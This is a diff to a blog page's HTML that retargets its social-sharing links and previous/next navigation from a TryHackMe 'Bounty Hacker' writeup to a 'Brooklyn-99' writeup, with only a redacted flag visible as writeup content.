+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-brooklyn-99-writeup%2f&amp;title=Tryhackme-%20Brooklyn-99%20Writeup&amp;summary=Tryhackme-%20Brooklyn-99%20Writeup&amp;source=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-brooklyn-99-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
   <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
     </div>
@@ -447,7 +449,7 @@ THM{REDACTED}
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-bounty-hacker-writeup%2f&amp;resubmit=true&amp;title=Tryhackme-%20Bounty%20Hacker%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-brooklyn-99-writeup%2f&amp;resubmit=true&amp;title=Tryhackme-%20Brooklyn-99%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
   <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
     </div>
@@ -455,7 +457,7 @@ THM{REDACTED}
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-bounty-hacker-writeup%2f;title=Tryhackme-%20Bounty%20Hacker%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on xing">
+<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-brooklyn-99-writeup%2f;title=Tryhackme-%20Brooklyn-99%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on xing">
   <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
     </div>
@@ -463,7 +465,7 @@ THM{REDACTED}
 </a>
 
 
-<a class="resp-sharing-button__link" href="whatsapp://send?text=Tryhackme-%20Bounty%20Hacker%20Writeup%20https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-bounty-hacker-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
+<a class="resp-sharing-button__link" href="whatsapp://send?text=Tryhackme-%20Brooklyn-99%20Writeup%20https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-brooklyn-99-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
   <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
     <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
     </div>
@@ -471,7 +473,7 @@ THM{REDACTED}
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-bounty-hacker-writeup%2f&amp;t=Tryhackme-%20Bounty%20Hacker%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
+<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-brooklyn-99-writeup%2f&amp;t=Tryhackme-%20Brooklyn-99%20Writeup" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
   <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
 			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
     </div>
@@ -479,7 +481,7 @@ THM{REDACTED}
 </a>
 
 
-<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Tryhackme-%20Bounty%20Hacker%20Writeup&amp;url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-bounty-hacker-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
+<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=Tryhackme-%20Brooklyn-99%20Writeup&amp;url=https%3a%2f%2f0xSh1v4.github.io%2fposts%2f2020%2f09%2ftryhackme-brooklyn-99-writeup%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
   <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
       <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
     </div>
@@ -497,11 +499,18 @@ THM{REDACTED}
 
         <div class="pagination__buttons">
           
+            <span class="button previous">
+              <a href="https://0xSh1v4.github.io/posts/2020/09/tryhackme-bounty-hacker-writeup/">
+                <span class="button__icon">←</span>
+                <span class="button__text">Tryhackme- Bounty Hacker Writeup</span>
+              </a>
+            </span>
+          
 
           
             <span class="button next">
-              <a href="https://0xSh1v4.github.io/posts/2020/09/tryhackme-brooklyn-99-writeup/">
-                <span class="button__text">Tryhackme- Brooklyn-99 Writeup</span>
+              <a href="https://0xSh1v4.github.io/posts/2020/09/tryhackme-wonderland-writeup/">
+                <span class="button__text">Tryhackme- Wonderland Writeup</span>
                 <span class="button__icon">→</span>
               </a>
             </span>
